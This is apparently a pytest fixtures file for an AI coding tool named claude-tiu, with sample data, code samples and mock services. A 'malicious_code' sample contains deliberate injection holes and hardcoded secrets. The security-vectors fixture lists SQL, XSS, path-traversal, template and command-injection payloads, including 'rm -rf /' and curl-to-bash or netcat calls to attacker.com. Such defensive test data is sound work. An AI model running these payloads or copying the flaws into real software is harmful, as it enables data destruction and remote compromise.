"""Comprehensive test fixtures for claude-tiu testing suite."""

import pytest\nimport asyncio\nimport tempfile\nimport json\nimport yaml\nfrom pathlib import Path\nfrom typing import Dict, List, Any, Generator, Optional\nfrom unittest.mock import Mock, AsyncMock, MagicMock\nfrom datetime import datetime, timedelta\n\nimport numpy as np\nfrom faker import Faker\nfrom hypothesis import strategies as st\n\n# Core application imports\ntry:\n    from src.core.config import Config\n    from src.core.project_manager import ProjectManager\n    from src.core.task_engine import TaskEngine\n    from src.core.ai_interface import AIInterface\n    from src.core.validator import Validator\n    from src.services.ai_service import AIService\n    from src.services.project_service import ProjectService\n    from src.services.task_service import TaskService\n    from src.services.validation_service import ValidationService\n    from src.database.models import Base, Project, Task, User\n    from src.api.main import app\nexcept ImportError:\n    # Mock imports if modules don't exist yet\n    Config = type('Config', (), {})\n    ProjectManager = type('ProjectManager', (), {})\n    TaskEngine = type('TaskEngine', (), {})\n    AIInterface = type('AIInterface', (), {})\n    Validator = type('Validator', (), {})\n    AIService = type('AIService', (), {})\n    ProjectService = type('ProjectService', (), {})\n    TaskService = type('TaskService', (), {})\n    ValidationService = type('ValidationService', (), {})\n    Base = type('Base', (), {})\n    Project = type('Project', (), {})\n    Task = type('Task', (), {})\n    User = type('User', (), {})\n    app = None\n\n# Initialize Faker for generating test data\nfake = Faker()\n\n\n# Configuration Fixtures\n@pytest.fixture(scope=\"session\")\ndef base_config() -> Dict[str, Any]:\n    \"\"\"Base configuration for all tests.\"\"\"\n    return {\n        \"environment\": \"test\",\n        \"debug\": True,\n        \"testing\": True,\n        \"database_url\": \"sqlite:///:memory:\",\n        \"api_key\": \"test-api-key-12345\",\n        \"secret_key\": \"test-secret-key-for-jwt-signing\",\n        \"security\": {\n            \"jwt_secret\": \"test-jwt-secret-key\",\n            \"jwt_algorithm\": \"HS256\",\n            \"access_token_expire_minutes\": 30,\n            \"password_min_length\": 8,\n            \"session_timeout\": 3600\n        },\n        \"ai_settings\": {\n            \"model_name\": \"test-model\",\n            \"max_tokens\": 2048,\n            \"temperature\": 0.7,\n            \"timeout\": 30\n        },\n        \"validation\": {\n            \"max_file_size_mb\": 10,\n            \"supported_languages\": [\"python\", \"javascript\", \"typescript\", \"java\", \"go\"],\n            \"placeholder_patterns\": [\"TODO\", \"FIXME\", \"NotImplementedError\", \"console.log\"]\n        },\n        \"performance\": {\n            \"max_concurrent_tasks\": 10,\n            \"task_timeout\": 300,\n            \"memory_limit_mb\": 512\n        }\n    }\n\n\n@pytest.fixture\ndef test_config(base_config) -> Config:\n    \"\"\"Test configuration instance.\"\"\"\n    return Config(**base_config)\n\n\n# File System Fixtures\n@pytest.fixture\ndef temp_directory() -> Generator[Path, None, None]:\n    \"\"\"Create a temporary directory for test files.\"\"\"\n    with tempfile.TemporaryDirectory() as tmp_dir:\n        yield Path(tmp_dir)\n\n\n@pytest.fixture\ndef project_directory(temp_directory) -> Path:\n    \"\"\"Create a structured project directory for testing.\"\"\"\n    project_dir = temp_directory / \"test_project\"\n    project_dir.mkdir(exist_ok=True)\n    \n    # Create standard project structure\n    directories = [\n        \"src\", \"tests\", \"docs\", \"config\", \"scripts\",\n        \"src/api\", \"src/core\", \"src/services\", \"src/ui\",\n        \"tests/unit\", \"tests/integration\", \"tests/ui\"\n    ]\n    \n    for directory in directories:\n        (project_dir / directory).mkdir(parents=True, exist_ok=True)\n    \n    # Create basic project files\n    project_files = {\n        \"README.md\": \"# Test Project\\n\\nA test project for claude-tiu.\",\n        \"requirements.txt\": \"pytest\\nfastapi\\ntextual\\nhypothesis\\n\",\n        \"pyproject.toml\": \"\"\"\n[build-system]\nrequires = [\"setuptools\", \"wheel\"]\nbuild-backend = \"setuptools.build_meta\"\n\n[project]\nname = \"test-project\"\nversion = \"0.1.0\"\ndescription = \"Test project\"\n\"\"\",\n        \"src/__init__.py\": \"\",\n        \"src/main.py\": \"def main():\\n    print('Hello, World!')\\n\\nif __name__ == '__main__':\\n    main()\",\n        \"tests/__init__.py\": \"\",\n        \"config/settings.yaml\": \"debug: true\\nlog_level: INFO\\n\"\n    }\n    \n    for file_path, content in project_files.items():\n        (project_dir / file_path).write_text(content)\n    \n    return project_dir\n\n\n# Data Generation Fixtures\n@pytest.fixture\ndef sample_users() -> List[Dict[str, Any]]:\n    \"\"\"Generate sample user data.\"\"\"\n    users = []\n    for i in range(10):\n        users.append({\n            \"id\": i + 1,\n            \"username\": fake.user_name(),\n            \"email\": fake.email(),\n            \"first_name\": fake.first_name(),\n            \"last_name\": fake.last_name(),\n            \"role\": fake.random_element(elements=[\"user\", \"admin\", \"moderator\"]),\n            \"created_at\": fake.date_time_between(start_date=\"-1y\", end_date=\"now\"),\n            \"is_active\": fake.boolean(chance_of_getting_true=90)\n        })\n    return users\n\n\n@pytest.fixture\ndef sample_projects() -> List[Dict[str, Any]]:\n    \"\"\"Generate sample project data.\"\"\"\n    templates = [\"python\", \"javascript\", \"typescript\", \"java\", \"go\", \"rust\"]\n    statuses = [\"initialized\", \"active\", \"completed\", \"archived\"]\n    \n    projects = []\n    for i in range(20):\n        projects.append({\n            \"id\": fake.uuid4(),\n            \"name\": fake.catch_phrase().lower().replace(\" \", \"-\"),\n            \"description\": fake.text(max_nb_chars=200),\n            \"template\": fake.random_element(elements=templates),\n            \"status\": fake.random_element(elements=statuses),\n            \"path\": f\"/projects/{fake.slug()}\",\n            \"created_at\": fake.date_time_between(start_date=\"-6m\", end_date=\"now\"),\n            \"updated_at\": fake.date_time_between(start_date=\"-1m\", end_date=\"now\"),\n            \"owner_id\": fake.random_int(min=1, max=10),\n            \"settings\": {\n                \"auto_format\": fake.boolean(),\n                \"enable_linting\": fake.boolean(),\n                \"python_version\": fake.random_element(elements=[\"3.9\", \"3.10\", \"3.11\", \"3.12\"]),\n                \"framework\": fake.random_element(elements=[\"fastapi\", \"django\", \"flask\", \"none\"])\n            },\n            \"metrics\": {\n                \"total_files\": fake.random_int(min=5, max=100),\n                \"total_functions\": fake.random_int(min=20, max=500),\n                \"lines_of_code\": fake.random_int(min=100, max=10000),\n                \"test_coverage\": fake.random_int(min=0, max=100)\n            }\n        })\n    return projects\n\n\n@pytest.fixture\ndef sample_tasks() -> List[Dict[str, Any]]:\n    \"\"\"Generate sample task data.\"\"\"\n    task_types = [\"code_generation\", \"refactoring\", \"testing\", \"documentation\", \"debugging\"]\n    priorities = [\"low\", \"medium\", \"high\", \"critical\"]\n    statuses = [\"pending\", \"running\", \"completed\", \"failed\", \"cancelled\"]\n    \n    tasks = []\n    for i in range(50):\n        created_at = fake.date_time_between(start_date=\"-30d\", end_date=\"now\")\n        \n        tasks.append({\n            \"id\": fake.uuid4(),\n            \"name\": f\"Task {i+1}: {fake.catch_phrase()}\",\n            \"description\": fake.text(max_nb_chars=300),\n            \"prompt\": fake.text(max_nb_chars=500),\n            \"task_type\": fake.random_element(elements=task_types),\n            \"priority\": fake.random_element(elements=priorities),\n            \"status\": fake.random_element(elements=statuses),\n            \"project_id\": fake.uuid4(),\n            \"assigned_to\": fake.random_int(min=1, max=10),\n            \"created_at\": created_at,\n            \"updated_at\": fake.date_time_between(start_date=created_at, end_date=\"now\"),\n            \"estimated_duration\": fake.random_int(min=15, max=480),  # minutes\n            \"actual_duration\": fake.random_int(min=10, max=600),  # minutes\n            \"dependencies\": fake.random_elements(elements=[f\"task-{j}\" for j in range(20)], length=fake.random_int(min=0, max=3), unique=True),\n            \"tags\": fake.random_elements(elements=[\"urgent\", \"feature\", \"bugfix\", \"enhancement\", \"refactor\"], length=fake.random_int(min=1, max=3), unique=True),\n            \"metadata\": {\n                \"complexity\": fake.random_element(elements=[\"low\", \"medium\", \"high\"]),\n                \"language\": fake.random_element(elements=[\"python\", \"javascript\", \"java\"]),\n                \"framework\": fake.random_element(elements=[\"react\", \"vue\", \"angular\", \"fastapi\", \"django\"])\n            }\n        })\n    return tasks\n\n\n# Code Sample Fixtures\n@pytest.fixture\ndef code_samples() -> Dict[str, str]:\n    \"\"\"Collection of code samples for testing.\"\"\"\n    return {\n        \"python_complete\": \"\"\"\ndef fibonacci(n: int) -> int:\n    \"\"\"Calculate the nth Fibonacci number.\"\"\"\n    if n <= 1:\n        return n\n    return fibonacci(n - 1) + fibonacci(n - 2)\n\ndef factorial(n: int) -> int:\n    \"\"\"Calculate factorial of n.\"\"\"\n    if n <= 1:\n        return 1\n    return n * factorial(n - 1)\n\nclass Calculator:\n    \"\"\"Simple calculator class.\"\"\"\n    \n    def __init__(self):\n        self.history = []\n    \n    def add(self, a: float, b: float) -> float:\n        result = a + b\n        self.history.append(f\"{a} + {b} = {result}\")\n        return result\n    \n    def get_history(self) -> list:\n        return self.history.copy()\n\"\"\",\n        \n        \"python_with_placeholders\": \"\"\"\ndef calculate_statistics(data):\n    \"\"\"Calculate basic statistics for a dataset.\"\"\"\n    # TODO: implement mean calculation\n    mean = None\n    \n    # TODO: implement median calculation\n    median = None\n    \n    def calculate_variance():\n        # TODO: implement variance calculation\n        pass\n    \n    # FIXME: this is a placeholder implementation\n    return {\"mean\": mean, \"median\": median}\n\ndef process_data(input_data):\n    \"\"\"Process input data.\"\"\"\n    raise NotImplementedError(\"Data processing not yet implemented\")\n\ndef debug_function():\n    console.log(\"Debug information here\")\n    return None\n\nclass IncompleteClass:\n    def __init__(self):\n        self.value = 0\n    \n    def incomplete_method(self):\n        # implement later\n        pass\n\"\"\",\n        \n        \"javascript_complete\": \"\"\"\nclass TaskManager {\n    constructor() {\n        this.tasks = [];\n        this.nextId = 1;\n    }\n    \n    addTask(title, description) {\n        const task = {\n            id: this.nextId++,\n            title: title,\n            description: description,\n            completed: false,\n            createdAt: new Date()\n        };\n        this.tasks.push(task);\n        return task;\n    }\n    \n    completeTask(id) {\n        const task = this.tasks.find(t => t.id === id);\n        if (task) {\n            task.completed = true;\n            task.completedAt = new Date();\n        }\n        return task;\n    }\n    \n    getTasks(includeCompleted = true) {\n        if (includeCompleted) {\n            return this.tasks.slice();\n        }\n        return this.tasks.filter(task => !task.completed);\n    }\n}\n\nfunction validateEmail(email) {\n    const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;\n    return emailRegex.test(email);\n}\n\"\"\",\n        \n        \"javascript_with_placeholders\": \"\"\"\nclass ApiClient {\n    constructor(baseUrl) {\n        this.baseUrl = baseUrl;\n    }\n    \n    async fetchData(endpoint) {\n        // TODO: implement error handling\n        // TODO: add authentication headers\n        const response = await fetch(`${this.baseUrl}/${endpoint}`);\n        return response.json();\n    }\n    \n    async postData(endpoint, data) {\n        // FIXME: implement proper request validation\n        console.log('Posting data:', data);\n        throw new Error('Not implemented yet');\n    }\n    \n    validateResponse(response) {\n        // implement validation logic\n        return true;\n    }\n}\n\nfunction processUserInput(input) {\n    // TODO: sanitize input\n    // TODO: validate input format\n    console.log('Processing:', input);\n    return input;\n}\n\"\"\",\n        \n        \"malicious_code\": \"\"\"\n# Potentially dangerous code samples for security testing\nimport os\nimport subprocess\n\ndef dangerous_function(user_input):\n    # Command injection vulnerability\n    os.system(f\"echo {user_input}\")\n    \n    # SQL injection vulnerability\n    query = f\"SELECT * FROM users WHERE name = '{user_input}'\"\n    \n    # Path traversal vulnerability\n    with open(f\"/data/{user_input}\", 'r') as f:\n        return f.read()\n\ndef hardcoded_secrets():\n    API_KEY = \"sk-1234567890abcdef1234567890abcdef\"\n    DATABASE_PASSWORD = \"admin123\"\n    JWT_SECRET = \"supersecretkey\"\n    return {\"api\": API_KEY, \"db\": DATABASE_PASSWORD}\n\"\"\",\n        \n        \"complex_algorithm\": \"\"\"\ndef quicksort(arr, low=0, high=None):\n    \"\"\"Optimized quicksort implementation with random pivot.\"\"\"\n    if high is None:\n        high = len(arr) - 1\n    \n    if low < high:\n        pivot_index = partition(arr, low, high)\n        quicksort(arr, low, pivot_index - 1)\n        quicksort(arr, pivot_index + 1, high)\n    \n    return arr\n\ndef partition(arr, low, high):\n    \"\"\"Partition function for quicksort.\"\"\"\n    import random\n    \n    # Choose random pivot to avoid worst-case performance\n    random_index = random.randint(low, high)\n    arr[random_index], arr[high] = arr[high], arr[random_index]\n    \n    pivot = arr[high]\n    i = low - 1\n    \n    for j in range(low, high):\n        if arr[j] <= pivot:\n            i += 1\n            arr[i], arr[j] = arr[j], arr[i]\n    \n    arr[i + 1], arr[high] = arr[high], arr[i + 1]\n    return i + 1\n\ndef binary_search(arr, target):\n    \"\"\"Binary search implementation.\"\"\"\n    left, right = 0, len(arr) - 1\n    \n    while left <= right:\n        mid = (left + right) // 2\n        \n        if arr[mid] == target:\n            return mid\n        elif arr[mid] < target:\n            left = mid + 1\n        else:\n            right = mid - 1\n    \n    return -1\n\"\"\"\n    }\n\n\n@pytest.fixture\ndef validation_test_cases() -> List[Dict[str, Any]]:\n    \"\"\"Test cases for validation scenarios.\"\"\"\n    return [\n        {\n            \"name\": \"complete_python_function\",\n            \"code\": \"def add(a, b):\\n    return a + b\",\n            \"expected_placeholders\": 0,\n            \"expected_quality\": \"high\",\n            \"language\": \"python\"\n        },\n        {\n            \"name\": \"function_with_todo\",\n            \"code\": \"def process():\\n    # TODO: implement processing\\n    pass\",\n            \"expected_placeholders\": 1,\n            \"expected_quality\": \"low\",\n            \"language\": \"python\"\n        },\n        {\n            \"name\": \"function_with_not_implemented\",\n            \"code\": \"def analyze():\\n    raise NotImplementedError('Analysis not ready')\",\n            \"expected_placeholders\": 1,\n            \"expected_quality\": \"low\",\n            \"language\": \"python\"\n        },\n        {\n            \"name\": \"javascript_with_console_log\",\n            \"code\": \"function debug() {\\n    console.log('debugging info');\\n    return null;\\n}\",\n            \"expected_placeholders\": 1,\n            \"expected_quality\": \"medium\",\n            \"language\": \"javascript\"\n        },\n        {\n            \"name\": \"mixed_quality_code\",\n            \"code\": \"\"\"\ndef good_function():\n    return \"This is complete\"\n\ndef incomplete_function():\n    # TODO: implement this\n    pass\n            \"\"\",\n            \"expected_placeholders\": 1,\n            \"expected_quality\": \"medium\",\n            \"language\": \"python\"\n        }\n    ]\n\n\n# Mock Service Fixtures\n@pytest.fixture\ndef mock_ai_service() -> Mock:\n    \"\"\"Mock AI service with realistic responses.\"\"\"\n    mock_service = Mock(spec=AIService)\n    \n    async def mock_generate_code(prompt: str, context: Dict[str, Any] = None) -> Dict[str, Any]:\n        # Simulate AI processing time\n        await asyncio.sleep(0.1)\n        \n        # Generate response based on prompt keywords\n        if \"function\" in prompt.lower():\n            code = f\"def generated_function():\\n    # Generated from prompt: {prompt[:50]}...\\n    return True\"\n        elif \"class\" in prompt.lower():\n            code = f\"class GeneratedClass:\\n    def __init__(self):\\n        self.value = 'generated'\"\n        else:\n            code = f\"# Generated code from prompt\\n# {prompt[:100]}...\"\n        \n        return {\n            \"status\": \"success\",\n            \"code\": code,\n            \"tokens_used\": len(prompt) // 4,  # Rough estimate\n            \"execution_time\": 0.1,\n            \"model\": \"test-model\",\n            \"context\": context or {}\n        }\n    \n    mock_service.generate_code = AsyncMock(side_effect=mock_generate_code)\n    \n    async def mock_analyze_code(code: str) -> Dict[str, Any]:\n        await asyncio.sleep(0.05)\n        \n        # Simple analysis based on code content\n        lines = code.split('\\n')\n        has_functions = any('def ' in line for line in lines)\n        has_classes = any('class ' in line for line in lines)\n        has_comments = any('#' in line for line in lines)\n        \n        quality_score = 0.5\n        if has_functions:\n            quality_score += 0.2\n        if has_classes:\n            quality_score += 0.1\n        if has_comments:\n            quality_score += 0.1\n        if len(lines) > 5:\n            quality_score += 0.1\n        \n        return {\n            \"quality_score\": min(quality_score, 1.0),\n            \"line_count\": len(lines),\n            \"has_functions\": has_functions,\n            \"has_classes\": has_classes,\n            \"suggestions\": [\"Consider adding type hints\", \"Add more documentation\"]\n        }\n    \n    mock_service.analyze_code = AsyncMock(side_effect=mock_analyze_code)\n    return mock_service\n\n\n@pytest.fixture\ndef mock_validation_service() -> Mock:\n    \"\"\"Mock validation service with realistic validation logic.\"\"\"\n    mock_service = Mock(spec=ValidationService)\n    \n    def mock_validate_code(code: str) -> Dict[str, Any]:\n        # Count placeholders using simple patterns\n        placeholder_patterns = [\"TODO\", \"FIXME\", \"NotImplementedError\", \"console.log\", \"pass\"]\n        placeholder_count = sum(pattern.lower() in code.lower() for pattern in placeholder_patterns)\n        \n        # Calculate quality score\n        total_lines = len(code.split('\\n'))\n        non_empty_lines = len([line for line in code.split('\\n') if line.strip()])\n        \n        if total_lines == 0:\n            quality_score = 0.0\n        else:\n            base_quality = non_empty_lines / total_lines\n            placeholder_penalty = placeholder_count * 0.2\n            quality_score = max(0.0, base_quality - placeholder_penalty)\n        \n        return {\n            \"has_placeholders\": placeholder_count > 0,\n            \"placeholder_count\": placeholder_count,\n            \"quality_score\": quality_score,\n            \"total_lines\": total_lines,\n            \"non_empty_lines\": non_empty_lines,\n            \"issues\": [f\"Found placeholder pattern: {p}\" for p in placeholder_patterns if p.lower() in code.lower()],\n            \"recommendations\": [\"Replace TODO comments with actual implementation\", \"Remove console.log statements\"]\n        }\n    \n    mock_service.validate_code = Mock(side_effect=mock_validate_code)\n    \n    async def mock_validate_project(project_path: str) -> Dict[str, Any]:\n        await asyncio.sleep(0.2)  # Simulate processing time\n        \n        return {\n            \"project_path\": project_path,\n            \"total_files\": fake.random_int(min=5, max=50),\n            \"validated_files\": fake.random_int(min=5, max=45),\n            \"overall_quality\": fake.random_int(min=60, max=95) / 100,\n            \"placeholder_files\": fake.random_int(min=0, max=10),\n            \"high_quality_files\": fake.random_int(min=15, max=40),\n            \"issues_found\": fake.random_int(min=0, max=15),\n            \"recommendations\": [\n                \"Implement remaining TODO items\",\n                \"Add comprehensive error handling\",\n                \"Increase test coverage\"\n            ]\n        }\n    \n    mock_service.validate_project = AsyncMock(side_effect=mock_validate_project)\n    return mock_service\n\n\n# Database Fixtures\n@pytest.fixture\ndef mock_database_session() -> Mock:\n    \"\"\"Mock database session for testing.\"\"\"\n    mock_session = Mock()\n    \n    # Mock data storage\n    mock_storage = {\n        'users': [],\n        'projects': [],\n        'tasks': []\n    }\n    \n    def mock_add(obj):\n        if hasattr(obj, '__tablename__'):\n            table_name = obj.__tablename__\n            if table_name in mock_storage:\n                mock_storage[table_name].append(obj)\n    \n    def mock_query(model):\n        mock_query_obj = Mock()\n        table_name = getattr(model, '__tablename__', 'unknown')\n        \n        def mock_filter(**kwargs):\n            # Simple filter implementation\n            filtered_data = mock_storage.get(table_name, [])\n            return Mock(first=lambda: filtered_data[0] if filtered_data else None,\n                       all=lambda: filtered_data)\n        \n        def mock_all():\n            return mock_storage.get(table_name, [])\n        \n        mock_query_obj.filter_by = mock_filter\n        mock_query_obj.all = mock_all\n        mock_query_obj.first = lambda: mock_storage.get(table_name, [None])[0]\n        return mock_query_obj\n    \n    mock_session.add = mock_add\n    mock_session.query = mock_query\n    mock_session.commit = Mock()\n    mock_session.rollback = Mock()\n    mock_session.close = Mock()\n    \n    # Store reference to mock storage for test access\n    mock_session._mock_storage = mock_storage\n    \n    return mock_session\n\n\n# API Testing Fixtures\n@pytest.fixture\ndef api_test_data() -> Dict[str, Any]:\n    \"\"\"Test data for API endpoint testing.\"\"\"\n    return {\n        \"valid_project_data\": {\n            \"name\": \"test-api-project\",\n            \"description\": \"A project created via API testing\",\n            \"template\": \"python\",\n            \"settings\": {\n                \"python_version\": \"3.11\",\n                \"framework\": \"fastapi\",\n                \"enable_linting\": True\n            }\n        },\n        \"invalid_project_data\": {\n            \"name\": \"\",  # Empty name should be invalid\n            \"description\": \"Invalid project data\",\n            \"template\": \"unsupported_template\"\n        },\n        \"valid_task_data\": {\n            \"name\": \"test-api-task\",\n            \"description\": \"A task created via API testing\",\n            \"prompt\": \"Generate a simple REST API endpoint\",\n            \"priority\": \"medium\",\n            \"estimated_duration\": 60\n        },\n        \"invalid_task_data\": {\n            \"name\": \"\",  # Empty name\n            \"prompt\": \"\",  # Empty prompt\n            \"priority\": \"invalid_priority\"\n        },\n        \"valid_user_data\": {\n            \"username\": \"testuser\",\n            \"email\": \"test@example.com\",\n            \"password\": \"securepassword123\",\n            \"first_name\": \"Test\",\n            \"last_name\": \"User\"\n        },\n        \"authentication_data\": {\n            \"valid_credentials\": {\n                \"username\": \"testuser\",\n                \"password\": \"securepassword123\"\n            },\n            \"invalid_credentials\": {\n                \"username\": \"nonexistent\",\n                \"password\": \"wrongpassword\"\n            }\n        }\n    }\n\n\n# Performance Testing Fixtures\n@pytest.fixture\ndef performance_test_data() -> Dict[str, Any]:\n    \"\"\"Generate data for performance testing.\"\"\"\n    return {\n        \"small_code_samples\": [f\"def function_{i}(): return {i}\" for i in range(10)],\n        \"medium_code_samples\": [\n            \"\\n\".join([f\"def function_{i}_{j}(): return {i} + {j}\" for j in range(10)])\n            for i in range(20)\n        ],\n        \"large_code_samples\": [\n            \"\\n\".join([f\"def function_{i}_{j}(): return {i} * {j} + {k}\" for j in range(50) for k in range(2)])\n            for i in range(5)\n        ],\n        \"concurrent_task_data\": [\n            {\n                \"id\": f\"perf-task-{i}\",\n                \"name\": f\"Performance Task {i}\",\n                \"prompt\": f\"Generate code for task {i}\",\n                \"complexity\": fake.random_element(elements=[\"low\", \"medium\", \"high\"])\n            }\n            for i in range(100)\n        ]\n    }\n\n\n# Security Testing Fixtures\n@pytest.fixture\ndef security_test_vectors() -> Dict[str, List[str]]:\n    \"\"\"Security test vectors for various attack types.\"\"\"\n    return {\n        \"sql_injection\": [\n            \"'; DROP TABLE users; --\",\n            \"' OR '1'='1\",\n            \"' UNION SELECT * FROM passwords --\",\n            \"admin'--\",\n            \"' OR 1=1#\"\n        ],\n        \"xss_attacks\": [\n            \"<script>alert('XSS')</script>\",\n            \"<img src=x onerror=alert('XSS')>\",\n            \"javascript:alert('XSS')\",\n            \"<svg onload=alert('XSS')>\",\n            \"'><script>alert(String.fromCharCode(88,83,83))</script>\"\n        ],\n        \"command_injection\": [\n            \"; rm -rf /\",\n            \"&& cat /etc/passwd\",\n            \"| nc attacker.com 1337\",\n            \"`cat /etc/passwd`\",\n            \"$(curl attacker.com/shell.sh | bash)\"\n        ],\n        \"path_traversal\": [\n            \"../../etc/passwd\",\n            \"../../../windows/system32/config/sam\",\n            \"....//....//....//etc/passwd\",\n            \"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd\"\n        ],\n        \"template_injection\": [\n            \"{{7*7}}\",\n            \"${jndi:ldap://attacker.com/exploit}\",\n            \"<%= system('id') %>\",\n            \"#{7*7}\"\n        ]\n    }\n\n\n# Hypothesis Strategies\n@pytest.fixture\ndef hypothesis_strategies():\n    \"\"\"Hypothesis strategies for property-based testing.\"\"\"\n    return {\n        \"project_names\": st.text(min_size=1, max_size=50, alphabet=st.characters(whitelist_categories=['Lu', 'Ll', 'Nd', 'Pd'])),\n        \"code_strings\": st.text(min_size=0, max_size=1000),\n        \"user_ids\": st.integers(min_value=1, max_value=1000000),\n        \"file_paths\": st.text(min_size=1, max_size=100, alphabet=st.characters(whitelist_categories=['Lu', 'Ll', 'Nd']) | st.just('/') | st.just('.')),\n        \"priorities\": st.sampled_from(['low', 'medium', 'high', 'critical']),\n        \"programming_languages\": st.sampled_from(['python', 'javascript', 'typescript', 'java', 'go', 'rust', 'cpp']),\n        \"quality_scores\": st.floats(min_value=0.0, max_value=1.0, allow_nan=False, allow_infinity=False)\n    }\n\n\n# Cleanup Fixtures\n@pytest.fixture(autouse=True)\ndef cleanup_test_artifacts(temp_directory):\n    \"\"\"Automatically cleanup test artifacts after each test.\"\"\"\n    yield\n    # Cleanup happens automatically with temporary directories\n    # Additional cleanup logic can be added here if needed\n\n\n@pytest.fixture(scope=\"session\", autouse=True)\ndef test_session_setup_teardown():\n    \"\"\"Setup and teardown for entire test session.\"\"\"\n    # Session setup\n    print(\"\\n=== Starting claude-tiu test session ===\")\n    \n    # Verify test environment\n    assert Path.cwd().name in ['claude-tiu', 'tests'], \"Tests should be run from project root or tests directory\"\n    \n    yield\n    \n    # Session teardown\n    print(\"\\n=== claude-tiu test session completed ===\")\n\n\n# Parametrized Fixtures\n@pytest.fixture(params=[\"python\", \"javascript\", \"java\", \"go\"])\ndef programming_language(request):\n    \"\"\"Parametrized fixture for testing multiple programming languages.\"\"\"\n    return request.param\n\n\n@pytest.fixture(params=[\"low\", \"medium\", \"high\"])\ndef complexity_level(request):\n    \"\"\"Parametrized fixture for testing different complexity levels.\"\"\"\n    return request.param\n\n\n@pytest.fixture(params=[10, 50, 100, 500])\ndef load_test_size(request):\n    \"\"\"Parametrized fixture for different load testing sizes.\"\"\"\n    return request.param\n\n\n# Custom Test Markers\ndef pytest_configure(config):\n    \"\"\"Configure custom pytest markers.\"\"\"\n    config.addinivalue_line(\"markers\", \"unit: Unit test\")\n    config.addinivalue_line(\"markers\", \"integration: Integration test\")\n    config.addinivalue_line(\"markers\", \"performance: Performance test\")\n    config.addinivalue_line(\"markers\", \"security: Security test\")\n    config.addinivalue_line(\"markers\", \"tui: Text User Interface test\")\n    config.addinivalue_line(\"markers\", \"validation: Validation test\")\n    config.addinivalue_line(\"markers\", \"slow: Slow running test\")\n    config.addinivalue_line(\"markers\", \"external: Test requiring external dependencies\")\n    config.addinivalue_line(\"markers\", \"api: API endpoint test\")\n    config.addinivalue_line(\"markers\", \"database: Database-related test\")